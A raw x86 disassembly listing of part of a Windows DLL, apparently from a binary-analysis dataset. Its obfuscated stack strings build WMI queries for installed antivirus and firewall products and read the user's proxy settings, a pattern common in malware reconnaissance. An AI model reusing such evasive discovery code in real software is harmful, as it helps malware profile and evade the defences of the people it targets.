call eax
lea ecx [ ebp - 0x88 ]
push ecx
lea edx [ ebp - 0xb4 ]
mov ecx esi
call sub_10008650
cmp [ ebp - 0x48 ] 0x10
mov esi eax
jb r-xdata
sub_10009280
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d708
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx + 0x14 ]
test eax eax
jne r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
push ebx
lea edx [ ebp - 0x40 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x40 ] 0x69746e41
mov [ ebp - 0x3c ] 0x75726956
mov [ ebp - 0x38 ] 0x6f725073
mov [ ebp - 0x34 ] 0x74637564
mov [ ebp - 0x30 ] al
call sub_10009650
lea esi [ ebx + 0x4 ]
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_10005ef0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x10
lea eax [ ebx + 0x4 ]
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
mov eax [ eax ]
jmp r-xdata
sub_10009340
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c4a1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov eax 0xf
mov [ esi + 0x18 ] eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
mov [ esi + 0x34 ] eax
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] bl
mov [ esi + 0x50 ] eax
mov [ esi + 0x4c ] ebx
mov [ esi + 0x3c ] bl
lea eax [ ebp - 0x30 ]
push eax
push r--data
push 0x1
push ebx
mov [ ebp - 0x4 ] 0x3
push r--data
mov [ ebp - 0x30 ] ebx
call [ CoCreateInstance@IAT ]
cmp eax ebx
jge r-xdata
mov edi [ ebp - 0x30 ]
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x4 ] 0x4
lea ebx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] 0x544f4f52
mov [ ebp - 0x20 ] 0x6365535c
mov [ ebp - 0x1c ] 0x74697275
mov [ ebp - 0x18 ] 0x6e654379
mov [ ebp - 0x14 ] 0x726574
call sub_10006e30
mov ebx eax
mov [ ebp - 0x3c ] ebx
lea ecx [ ebp - 0x2c ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x30 ]
push 0x0
push 0x0
mov [ ebp - 0x2c ] 0x0
mov edx [ eax ]
mov edx [ edx + 0xc ]
push ebx
push eax
call edx
test eax eax
jns r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
push ecx
mov [ ebp - 0x28 ] 0x90001
call sub_10013848
mov ecx [ ebp - 0x2c ]
push 0x0
push 0x0
push 0x3
push 0x3
push 0x0
push 0x0
push 0xa
push ecx
call [ CoSetProxyBlanket@IAT ]
test eax eax
jns r-xdata
push r--data
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x28 ] 0x90001
call sub_10013848
mov ecx [ ebp - 0x2c ]
mov [ esi + 0x58 ] ecx
test ebx ebx
je r-xdata
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x4 ] 0x6
jmp r-xdata
mov [ ebp - 0x4 ] 0x3
test edi edi
je r-xdata
push ebx
call [ SysFreeString@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx + 0x8 ]
push edi
call eax
sub_100094b0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10009590
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100094e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d6d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
push ebx
lea edx [ ebp - 0x3c ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x3c ] 0x65726946
mov [ ebp - 0x38 ] 0x6c6c6177
mov [ ebp - 0x34 ] 0x646f7250
mov [ ebp - 0x30 ] 0x746375
call sub_10009650
lea esi [ ebx + 0x20 ]
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_10005ef0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
xor eax eax
cmp [ ebx + 0x34 ] 0x10
lea eax [ ebx + 0x20 ]
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
mov eax [ eax ]
jmp r-xdata
sub_10009590
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c439
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x58 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ esi + 0x50 ] 0x10
jb r-xdata
xor ebx ebx
mov [ esi + 0x50 ] 0xf
mov [ esi + 0x4c ] ebx
mov [ esi + 0x3c ] bl
cmp [ esi + 0x34 ] 0x10
jb r-xdata
mov eax [ esi + 0x3c ]
push eax
call sub_10012c4b
add esp 0x4
mov [ esi + 0x34 ] 0xf
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] bl
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx [ esi + 0x20 ]
push ecx
call sub_10012c4b
add esp 0x4
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0x4 ]
push edx
call sub_10012c4b
add esp 0x4
sub_10009650
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d6a1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x464 ] ebx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
mov [ ebp - 0x444 ] eax
mov [ ebp - 0x458 ] ecx
mov [ ebp - 0x454 ] edx
mov [ ecx ] bl
mov [ ebp - 0x4 ] ebx
mov al 0x6c
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x18 ] 0x656c6553
mov [ ebp - 0x14 ] 0x207463
mov [ ebp - 0x24 ] 0x70736964
mov [ ebp - 0x20 ] al
mov [ ebp - 0x1f ] 0x614e7961
mov [ ebp - 0x1b ] 0x656d
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x450 ] 0x6f726620
mov [ ebp - 0x44c ] 0x206d
mov [ ebp - 0x44a ] bl
xor ecx ecx
lea esp [ esp ]
mov dl [ ebp + ecx - 0x18 ]
mov [ ebp + ecx - 0x424 ] dl
inc ecx
cmp dl bl
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx ecx
mov al [ ecx ]
inc ecx
cmp al bl
jne r-xdata
sub ecx edx
lea edi [ ebp - 0x424 ]
mov esi edx
mov edx ecx
dec edi
lea esp [ esp ]
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov ecx edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x450 ]
mov edx ecx
mov edi edi
mov al [ ecx ]
inc ecx
cmp al bl
jne r-xdata
sub ecx edx
lea edi [ ebp - 0x424 ]
mov esi edx
mov edx ecx
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov eax [ ebp - 0x454 ]
mov ecx edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x424 ]
sub eax esi
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea ebx [ ebp - 0x424 ]
[ edi ] [ esi ]
call sub_10006e30
mov esi eax
mov [ ebp - 0x460 ] esi
mov [ ebp - 0x480 ] esi
lea ebx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006e30
mov edi eax
mov [ ebp - 0x46c ] edi
mov [ ebp - 0x484 ] edi
lea edx [ ebp - 0x45c ]
push edx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x444 ]
mov eax [ eax + 0x58 ]
xor ebx ebx
push ebx
push 0x20
push esi
mov [ ebp - 0x45c ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx + 0x50 ]
call eax
cmp eax ebx
jl r-xdata
mov esi [ SysFreeString@IAT ]
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x45c ]
mov [ ebp - 0x468 ] eax
lea edx [ ebp - 0x448 ]
push edx
lea edx [ ebp - 0x444 ]
push edx
mov [ ebp - 0x4 ] 0x3
push 0x1
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x444 ] ebx
mov ecx [ eax ]
push 0xffffffff
push eax
mov eax [ ecx + 0x10 ]
call eax
cmp eax ebx
jl r-xdata
mov eax [ ebp - 0x460 ]
cmp eax ebx
je r-xdata
push edi
call esi
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x468 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x458 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x4
push eax
call esi
xor eax eax
mov [ ebp - 0x454 ] eax
cmp [ ebp - 0x448 ] ebx
jbe r-xdata
mov eax [ ebp - 0x45c ]
lea edx [ ebp - 0x448 ]
push edx
lea edx [ ebp - 0x444 ]
push edx
push 0x1
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x444 ] ebx
mov ecx [ eax ]
push 0xffffffff
push eax
mov eax [ ecx + 0x10 ]
call eax
cmp eax ebx
jge r-xdata
mov edi edi
inc eax
mov [ ebp - 0x454 ] eax
cmp eax [ ebp - 0x448 ]
jb r-xdata
mov [ ebp - 0x14 ] esi
lea ecx [ ebp - 0x47c ]
mov edx ecx
push edx
mov [ ebp - 0x450 ] ecx
call [ VariantInit@IAT ]
push ebx
push ebx
lea ecx [ ebp - 0x47c ]
push ecx
push ebx
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
mov edx [ eax + 0x10 ]
push edi
push esi
call edx
cmp eax ebx
jl r-xdata
mov esi [ ebp + eax * 4 - 0x444 ]
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x458 ]
push 0x2
mov eax r--data
call sub_10002a60
cmp [ ebp - 0x47c ] 0x8
jne r-xdata
mov edx [ ebp - 0x474 ]
mov eax edx
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push edx
mov ecx eax
lea ebx [ ebp - 0x440 ]
call sub_10006ec0
add esp 0x4
push 0x0
mov [ ebp - 0x4 ] 0x6
mov edi [ ebp - 0x458 ]
push eax
or eax 0xffffffff
call sub_10002bb0
cmp [ ebp - 0x42c ] 0x10
jb r-xdata
lea ecx [ ebp - 0x47c ]
push ecx
call [ VariantClear@IAT ]
mov [ ebp - 0x4 ] 0x3
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push esi
call eax
mov edi [ ebp - 0x46c ]
mov eax [ ebp - 0x454 ]
xor ebx ebx
mov eax [ ebp - 0x440 ]
push eax
call sub_10012c4b
add esp 0x4
jmp r-xdata
sub_100099f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d0ab
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0x0
call [ CoInitializeSecurity@IAT ]
push 0x5c
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push 0x1
call sub_10012ca7
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov esi eax
call sub_10009340
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
xor esi esi
push 0x0
call [ CoInitialize@IAT ]
jmp r-xdata
mov [ rw-data ] esi
sub_10009aa0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
lea eax [ ebp - 0xc ]
push eax
xor edi edi
mov [ ebp - 0xc ] 0x686e6977
mov [ ebp - 0x8 ] 0x707474
mov [ ebp - 0x34 ] 0x486e6957
mov [ ebp - 0x30 ] 0x47707474
mov [ ebp - 0x2c ] 0x45497465
mov [ ebp - 0x28 ] 0x786f7250
mov [ ebp - 0x24 ] 0x6e6f4379
mov [ ebp - 0x20 ] 0x46676966
mov [ ebp - 0x1c ] 0x7543726f
mov [ ebp - 0x18 ] 0x6e657272
mov [ ebp - 0x14 ] 0x65735574
mov [ ebp - 0x10 ] 0x72
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10012771
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x34 ]
push ecx
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push esi
call [ FreeLibrary@IAT ]
xor ecx ecx
lea edx [ ebp - 0x44 ]
push edx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x3c ]
mov ebx [ GlobalFree@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x38 ]
test eax eax
je r-xdata
push eax
mov edi 0x1
call ebx
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
push eax
call ebx
push eax
call ebx
sub_10009ba0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bed0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
lea edx [ ebp - 0x20 ]
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x64 ]
call eax
mov ecx [ ebp - 0x20 ]
mov esi ecx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] ebx
cmp eax ebx
jl r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x24 ] ebx
mov edx [ ecx ]
push eax
push ecx
mov ecx [ edx + 0x20 ]
call ecx
mov ecx [ ebp - 0x24 ]
mov edi ecx
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
jl r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi ]
mov edx [ ecx + 0x8 ]
push esi
call edx
mov [ ebp - 0x4 ] bl
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] ebx
mov edx [ ecx ]
push r--data
push ecx
mov ecx [ edx ]
call ecx
mov ecx [ ebp - 0x14 ]
mov esi ecx
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
jl r-xdata
mov edx [ edi ]
mov eax [ edx + 0x8 ]
push edi
call eax
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
push ebx
lea eax [ ebp + 0x8 ]
push eax
mov [ ebp + 0x8 ] ebx
mov edx [ ecx ]
push 0x1
push ecx
mov ecx [ edx + 0xc ]
call ecx
test eax eax
jne r-xdata
mov esi [ ebp - 0x1c ]
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
mov eax [ ebp + 0x8 ]
mov esi eax
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] ebx
mov edx [ eax ]
mov edx [ edx ]
push r--data
push eax
call edx
mov ecx [ ebp - 0x10 ]
mov edi ecx
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x4
cmp eax ebx
jl r-xdata
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x4 ] 0x3
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] ebx
mov eax [ ecx ]
mov eax [ eax + 0x2c ]
push edx
push ecx
call eax
cmp eax ebx
jl r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov edx [ edx + 0xc ]
push ebx
lea ecx [ ebp + 0x8 ]
push ecx
push 0x1
push eax
call edx
test eax eax
je r-xdata
mov ecx [ edi ]
mov edx [ ecx + 0x8 ]
push edi
call edx
mov edi [ ebp - 0x28 ]
mov [ ebp - 0x34 ] edi
push r--data
push edi
mov [ ebp - 0x4 ] 0x5
call sub_1001a965
add esp 0x8
test eax eax
je r-xdata
mov esi [ ebp - 0x2c ]
mov edi [ ebp - 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x34 ] eax
cmp edi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x18 ]
cmp eax ebx
je r-xdata
push edi
call [ SysFreeString@IAT ]
mov edi [ ebp - 0x18 ]
push edi
call [ SysFreeString@IAT ]
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ ebp - 0x4 ] bl
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
sub_10009de0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c028
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10009e50
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c11b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ esi ] r--data
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ ebp - 0x4 ] edi
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
push eax
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x14 ] edi
call eax
mov ecx [ ebp - 0x14 ]
mov ebx ecx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] 0x1
cmp eax edi
jge r-xdata
lea eax [ ebp + 0xc ]
push eax
mov [ ebp + 0xc ] edi
mov edx [ ecx ]
push r--data
push ecx
mov ecx [ edx ]
call ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] 0x2
cmp eax edi
jge r-xdata
mov [ ebp - 0x4 ] 0x0
cmp ecx edi
je r-xdata
push edi
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] edi
mov eax [ ecx ]
mov eax [ eax + 0xc ]
push 0x1
push ecx
call eax
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x1
cmp ecx edi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push ecx
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx ]
mov ecx [ eax + 0x8 ]
push ebx
call ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebx ]
mov edx [ ecx + 0x8 ]
push ebx
call edx
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push ecx
call eax
mov eax [ ebp - 0x10 ]
mov ebx eax
mov [ ebp - 0x24 ] ebx
lea edx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x3
push edx
mov [ ebp - 0x18 ] edi
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov ecx [ ebp - 0x18 ]
mov edi ecx
mov [ ebp - 0x28 ] edi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_1000a0b0
mov [ ebp - 0x4 ] 0x3
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx ]
mov ecx [ eax + 0x8 ]
push ebx
call ecx
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov edx [ edx + 0xc ]
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call edx
test eax eax
je r-xdata
mov ecx [ edi ]
mov edx [ ecx + 0x8 ]
push edi
call edx
xor edi edi
mov ebx [ ebp - 0x1c ]
sub_10009fc0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10009ff0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10009ff0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c0cb
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
sar eax 0x2
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
mov edi [ esi + 0x4 ]
cmp edi ecx
je r-xdata
mov edi [ esi + 0x4 ]
mov ebx [ esi + 0x8 ]
cmp edi ebx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call sub_100128c0
add esp 0xc
add ebx edi
mov [ esi + 0x8 ] ebx
mov ecx [ edi ]
test ecx ecx
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_10012c4b
add esp 0x4
add edi 0x4
cmp edi ebx
jne r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
sub_1000a0b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c6d3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x8
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor edi edi
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x4 ] edi
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
push edi
call ecx
mov edi esi
jmp r-xdata
cmp eax [ esi + 0xc ]
jne r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx edx
ja r-xdata
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x8 ]
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] edi
cmp edx eax
jae r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
call sub_100053c0
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0xc ]
jne r-xdata
add [ esi + 0x8 ] 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ eax ] edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
call sub_100053c0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_1000a190
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi ] r--data
je r-xdata
push eax
call sub_10012c4b
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_1000a1f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001be83
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov [ ebp - 0x4 ] edx
lea esi [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ esi ] edx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] edx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x1
mov eax [ eax + 0xc ]
mov [ ebp - 0x14 ] edx
cmp [ eax ] edx
je r-xdata
mov eax ecx
